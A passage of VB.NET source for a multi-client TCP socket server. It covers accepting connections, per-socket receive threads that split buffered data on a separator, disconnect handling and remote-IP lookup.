                Dim sock As Integer = NEWSKT()
                SK(sock) = S.AcceptSocket

                SK(sock).ReceiveBufferSize = 99999
                SK(sock).SendBufferSize = 99999
                SK(sock).ReceiveTimeout = 9000
                SK(sock).SendTimeout = 9000

                Dim t As New Threading.Thread(AddressOf RC, 10)
                t.Start(sock)

                RaiseEvent Connected(sock)

            End If
            GoTo re
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub
    Public Sub Disconnect(ByVal Sock As Integer)

        Try
            SK(Sock).Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            SK(Sock).Close()
        Catch ex As Exception
        End Try
        SK(Sock) = Nothing
    End Sub
    Sub RC(ByVal sock As Integer)

        Dim M As New IO.MemoryStream
        Dim cc As Integer = 0

re:

        cc += 1
        If cc = 500 Then
            Try
                If SK(sock).Poll(-1, Net.Sockets.SelectMode.SelectRead) And SK(sock).Available <= 0 Then
                    GoTo e
                End If
            Catch ex As Exception
                GoTo e
            End Try
            cc = 0
        End If
        Try
            If SK(sock) IsNot Nothing Then

                If SK(sock).Connected Then
                    If SK(sock).Available > 0 Then
                        Dim B(SK(sock).Available - 1) As Byte
                        SK(sock).Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                        M.Write(B, 0, B.Length)
rr:
                        If BSS(M.ToArray).Contains(SPL) Then
                            Dim A As Array = fxx(M.ToArray, SPL)
                            RaiseEvent Data(sock, A(0))
                            M.Dispose()
                            M = New IO.MemoryStream
                            If A.Length = 2 Then
                                M.Write(A(1), 0, A(1).length)
                                Threading.Thread.CurrentThread.Sleep(1)
                                GoTo rr
                            End If
                        End If

                    End If
                Else
                    GoTo e
                End If
            Else
                GoTo e
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
e:
        Disconnect(sock)
        Try
            Online.Remove(sock)
        Catch ex As Exception
        End Try
        RaiseEvent DisConnected(sock)
    End Sub
    Private oIP(9999) As String
    Public Function IP(ByRef sock As Integer) As String
        Try
            oIP(sock) = Split(SK(sock).RemoteEndPoint.ToString(), ":")(0)
            Return oIP(sock)
        Catch ex As Exception
            If oIP(sock) Is Nothing Then
                Return "X.X.X.X"
            Else
                Return oIP(sock)
            End If
        End Try
    End Function
End Class
